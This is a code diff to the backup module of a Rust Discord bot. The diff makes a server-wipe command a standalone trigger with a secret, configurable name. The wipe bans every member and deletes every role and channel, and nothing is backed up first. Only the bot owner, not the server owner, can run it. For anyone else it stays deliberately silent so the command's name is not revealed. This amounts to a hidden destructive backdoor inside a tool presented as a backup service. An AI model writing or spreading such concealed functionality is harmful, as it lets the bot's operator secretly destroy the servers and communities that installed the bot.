@@ -960,9 +960,9 @@ fn invite_channel(b: &Backup, chan_map: &HashMap<String, ChannelId>) -> Option<C
         .copied()
 }
 
-/// `!backup wipe`: ban every member and delete every role and channel, with
-/// nothing recreated - a blank server. Nothing is backed up first, so it asks
-/// for a typed confirmation, not just a button.
+/// `!wipe` (name configurable): ban every member and delete every role and
+/// channel, with nothing recreated - a blank server. Nothing is backed up
+/// first, so it asks for a button confirmation before doing anything.
 async fn wipe(ctx: &Context, msg: &Message, info: &GuildInfo) {
     let gid = info.id;
     let me = ctx.cache.current_user().id;
@@ -1309,10 +1309,10 @@ pub async fn run_due_intervals(ctx: &Context) {
 
 pub const PREFIX: &str = "!backup";
 
-/// The `!backup <sub>` word that triggers a full server wipe. Read once from
-/// `backup_wipe_command.txt` at the repo root (default `wipe`), so it can be
-/// renamed - or set to something only you know - without touching the code.
-/// Bot owner only.
+/// The word that triggers a full server wipe, used as its own `!` command.
+/// Read once from `backup_wipe_command.txt` at the repo root (default `wipe`),
+/// so it can be renamed - or set to something only you know - without touching
+/// the code. If the file holds `wipe`, the command is `!wipe`. Bot owner only.
 pub static WIPE_COMMAND: Lazy<String> = Lazy::new(|| {
     std::fs::read_to_string(crate::common::config::root_file("backup_wipe_command.txt"))
         .ok()
@@ -1320,6 +1320,14 @@ pub static WIPE_COMMAND: Lazy<String> = Lazy::new(|| {
         .filter(|s| !s.is_empty())
         .unwrap_or_else(|| "wipe".to_string())
 });
+
+/// The full standalone trigger for a wipe, e.g. `!wipe`.
+pub static WIPE_TRIGGER: Lazy<String> = Lazy::new(|| format!("!{}", *WIPE_COMMAND));
+
+/// Whether `content`'s first word is the standalone wipe command (e.g. `!wipe`).
+pub fn is_wipe_trigger(content: &str) -> bool {
+    content.split_whitespace().next().is_some_and(|w| w.eq_ignore_ascii_case(&WIPE_TRIGGER))
+}
 
 const USAGE: &str = "`!backup create` · take a backup of this server
 `!backup list` · your backups
@@ -1401,6 +1409,19 @@ fn parse_load(args: &[&str]) -> Result<(String, LoadOptions), String> {
     Ok((id.to_string(), o))
 }
 
+/// Handle the standalone wipe command (e.g. `!wipe`). Bot owner only; for
+/// anyone else it stays silent so the command's name isn't given away.
+pub async fn handle_wipe(ctx: &Context, msg: &Message) {
+    let Some(guild_id) = msg.guild_id else { return };
+    if !crate::common::permissions::is_owner(msg.author.id) {
+        return;
+    }
+    let Some(info) = GuildInfo::from_cache(ctx, guild_id) else {
+        return respond(ctx, msg, Tone::Error, None, "I'm still loading this server's details. Give it a few seconds and try again.").await;
+    };
+    wipe(ctx, msg, &info).await;
+}
+
 /// Handle a `!backup …` message. Server owner and bot owners only.
 pub async fn handle_message(ctx: &Context, msg: &Message) {
     let Some(guild_id) = msg.guild_id else { return };
@@ -1415,13 +1436,6 @@ pub async fn handle_message(ctx: &Context, msg: &Message) {
     let args = words.get(2..).unwrap_or_default();
     let owner = msg.author.id.to_string();
 
-    // The wipe command is bot-owner only; everything else is server-owner only.
-    if sub == *WIPE_COMMAND {
-        if !crate::common::permissions::is_owner(msg.author.id) {
-            return respond(ctx, msg, Tone::Denied, None, "That one's for the bot owner only.").await;
-        }
-        return wipe(ctx, msg, &info).await;
-    }
     if msg.author.id != info.owner_id {
         return respond(ctx, msg, Tone::Denied, None, OWNER_ONLY).await;
     }
